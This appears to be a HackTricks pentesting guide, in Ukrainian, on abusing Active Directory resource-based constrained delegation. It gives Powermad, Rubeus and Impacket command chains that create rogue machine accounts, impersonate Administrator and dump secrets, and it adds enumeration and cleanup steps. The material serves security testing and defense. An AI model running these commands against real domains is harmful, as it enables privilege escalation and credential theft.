# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

Це схоже на базовий [Constrained Delegation](constrained-delegation.md), але **замість** того, щоб надавати дозволи **об'єкту** для **видавання себе за будь-якого користувача перед машиною**. Resource-based Constrain Delegation **встановлює** в **об'єкті, хто може видавати себе за будь-якого користувача перед ним**.

У цьому випадку в обмеженого об'єкта буде атрибут _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ з іменем користувача, який може видавати себе за будь-якого іншого користувача перед ним.

Ще одна важлива відмінність від цього Constrained Delegation від інших делегацій полягає в тому, що будь-який користувач з **правами запису над обліковим записом машини** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) може встановити **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (в інших формах делегації вам знадобилися привілеї domain admin).

### New Concepts

У випадку Constrained Delegation казали, що прапорець **`TrustedToAuthForDelegation`** всередині значення _userAccountControl_ користувача потрібен для виконання **S4U2Self.** Але це не зовсім правда.\  
Насправді навіть без цього прапорця ви можете виконати **S4U2Self** проти будь-якого користувача, якщо ви є **сервісом** (маєте SPN), але якщо ви **маєте `TrustedToAuthForDelegation`**, повернутий TGS буде **Forwardable**, а якщо ви **не маєте** цього прапорця — повернутий TGS **не буде** **Forwardable**.

Однак якщо **TGS**, що використовується в **S4U2Proxy**, **не є Forwardable**, спроба зловживати **basic Constrain Delegation** **не спрацює**. Але якщо ви намагаєтесь експлуатувати **Resource-Based constrain delegation**, це спрацює.

### Attack structure

> Якщо у вас є **еквівалентні права запису** над обліковим записом комп'ютера, ви можете отримати **привілейований доступ** до тієї машини.

Припустимо, що атакувальник вже має **еквівалентні права запису над цільовим комп'ютером**.

1. Атакувальник **компрометує** обліковий запис, який має **SPN**, або **створює такий** (“Service A”). Зверніть увагу, що **будь-який** _Admin User_ без додаткових привілеїв може **створити** до 10 Computer objects (**_MachineAccountQuota_**) і встановити їм **SPN**. Отже атакувальник може просто створити об'єкт Computer і встановити SPN.
2. Атакувальник **зловживає своїм правом WRITE** над цільовим комп'ютером (ServiceB), щоб налаштувати **resource-based constrained delegation**, дозволивши Service A видавати себе за будь-якого користувача перед цим цільовим комп'ютером (ServiceB).
3. Атакувальник використовує Rubeus для виконання **повної атаки S4U** (S4U2Self і S4U2Proxy) від Service A до Service B для користувача, **який має привілейований доступ до Service B**.
   1. S4U2Self (зкомпрометованого/створеного облікового запису зі SPN): Запитати **TGS від Administrator до мене** (Not Forwardable).
   2. S4U2Proxy: Використати **не-Forwardable TGS** з попереднього кроку, щоб запросити **TGS** від **Administrator** до **цільового хоста**.
   3. Навіть якщо ви використовуєте не-Forwardable TGS, оскільки ви експлуатуєте Resource-based constrained delegation, це спрацює.
   4. Атакувальник може **pass-the-ticket** та **видавати себе** за користувача, щоб отримати **доступ до цільового ServiceB**.

Щоб перевірити _**MachineAccountQuota**_ домену, можна використовувати:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Атака

### Створення об'єкта комп'ютера

Можна створити об'єкт комп'ютера в домені за допомогою **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Налаштування обмеженого делегування на основі ресурсів

**Використання модуля activedirectory у PowerShell**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Використання powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Проведення повного S4U attack (Windows/Rubeus)

По-перше, ми створили новий об'єкт Computer з паролем `123456`, тому нам потрібен хеш цього пароля:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Це виведе RC4 та AES хеші для цього облікового запису.\
Тепер attack можна виконати:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Ви можете згенерувати більше квитків для додаткових служб, просто запросивши це один раз за допомогою параметра `/altservice` у Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Зверніть увагу, що в користувачів є атрибут "**Cannot be delegated**". Якщо в користувача цей атрибут встановлено в True, ви не зможете виконувати дії від його імені. Цю властивість можна побачити в bloodhound.
 
### Інструменти для Linux: повний ланцюг RBCD з Impacket (2024+)

Якщо ви оперуєте з Linux, ви можете виконати повний ланцюг RBCD, використовуючи офіційні інструменти Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Примітки
- Якщо LDAP signing/LDAPS примусово ввімкнено, використовуйте `impacket-rbcd -use-ldaps ...`.
- Надавайте перевагу AES-ключам; багато сучасних доменів обмежують RC4. Impacket і Rubeus обидва підтримують AES-only flows.
- Impacket може переписувати `sname` ("AnySPN") для деяких інструментів, але по можливості отримуйте правильний SPN (наприклад, CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Доступ

Остання командна стрічка виконає **complete S4U attack and will inject the TGS** від Administrator на цільовий хост у **пам'ять**.\
У цьому прикладі було запрошено TGS для сервісу **CIFS** від Administrator, тож ви зможете отримати доступ до **C$**:
```bash
ls \\victim.domain.local\C$
```
### Зловживання різними сервісними квитками

Дізнайтеся про [**available service tickets here**](silver-ticket.md#available-services).

## Перерахування, аудит та очищення

### Перерахувати комп'ютери з налаштованим RBCD

PowerShell (декодування SD для визначення SIDs):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (read or flush with one command):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Очищення / скидання RBCD

- PowerShell (очистити атрибут):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Помилки Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що kerberos налаштовано так, щоб не використовувати DES або RC4, а ви передаєте лише RC4-хеш. Передайте Rubeus щонайменше AES256-хеш (або передайте йому rc4, aes128 та aes256 хеші). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Це означає, що час на поточному комп'ютері відрізняється від часу DC і kerberos не працює належним чином.
- **`preauth_failed`**: Це означає, що вказані username + хеші не дозволяють увійти. Можливо, ви забули поставити "$" всередині імені користувача при генерації хешів (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Це може означати:
- Користувач, якого ви намагаєтесь impersonate, не може отримати доступ до бажаної служби (тому що ви не можете його impersonate або тому що він не має достатніх привілеїв)
- Запитана служба не існує (якщо ви просите квиток для winrm, але winrm не запущений)
- Створений fakecomputer втратив свої привілеї над вразливим сервером і вам потрібно їх відновити.
- Ви зловживаєте класичним KCD; пам'ятайте, що RBCD працює з non-forwardable S4U2Self tickets, тоді як KCD вимагає forwardable.

## Примітки, relays та альтернативи

- Ви також можете записати RBCD SD через AD Web Services (ADWS), якщо LDAP фільтрується. Дивіться:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Ланцюжки Kerberos relay часто закінчуються RBCD, щоб досягти local SYSTEM в один крок. Дивіться практичні end-to-end приклади:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Якщо LDAP signing/channel binding are **disabled** і ви можете створити a machine account, інструменти на кшталт **KrbRelayUp** можуть relay a coerced Kerberos auth to LDAP, встановити `msDS-AllowedToActOnBehalfOfOtherIdentity` для вашого machine account на об'єкті цільового комп'ютера та негайно impersonate **Administrator** via S4U з поза хоста.

## Джерела

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
